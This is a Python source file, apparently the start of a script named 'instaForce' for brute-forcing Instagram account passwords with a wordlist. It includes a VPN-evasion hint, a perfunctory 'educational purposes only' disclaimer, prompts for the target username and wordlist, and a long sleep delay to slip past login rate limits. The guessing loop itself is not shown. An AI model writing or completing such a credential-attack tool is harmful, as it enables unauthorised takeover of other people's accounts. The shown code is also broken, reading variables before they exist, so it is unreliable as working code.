import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random

os.system("mode con:cols=160 lines=60")
os.system("color 3")
def start():
    print('''

 _           _          ___                  
(_)_ __  ___| |_ __ _  / __\__  _ __ ___ ___ 
| | '_ \/ __| __/ _` |/ _\/ _ \| '__/ __/ _ |
| | | | \__ \ || (_| / / | (_) | | | (_|  __/
|_|_| |_|___/\__\__,_\/   \___/|_|  \___\___|

[vpn support for windows has not yet been added, so if you want make sure you are using a vpn]                                                                                    
    '''
    )
    os.system("cls")
    print("\n\nthe author assumes no responsability for how this content will be used\n=======================================================================\n\n")
    sceltadisc = input("\n\nUse this content for educational purposes only? [yes/no]: ")
    if sceltadisc == "yes":
        print("\n")
        os.system("cls")
    else:
        exit()

def acquisizione():
    while True:
        if veri_break == "si":
            break
        USER = ""
        USER = input('\nUsername: @')
        wl = input("\nWord list: ")
        sleepp = int(input("\nInsert sleep time for login [Raccomanded 900(15min)]: "))
        while True:
            os.system("cls")
            procedere = input("Username to bruteforce = "+USER+"\n\nWordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
            if procedere == "y":
                veri_break = "si"
                break
            elif procedere == "modify":
                print("\nReturn...")
                break
            elif procedere == "break":
                exit()
            else:
                pass

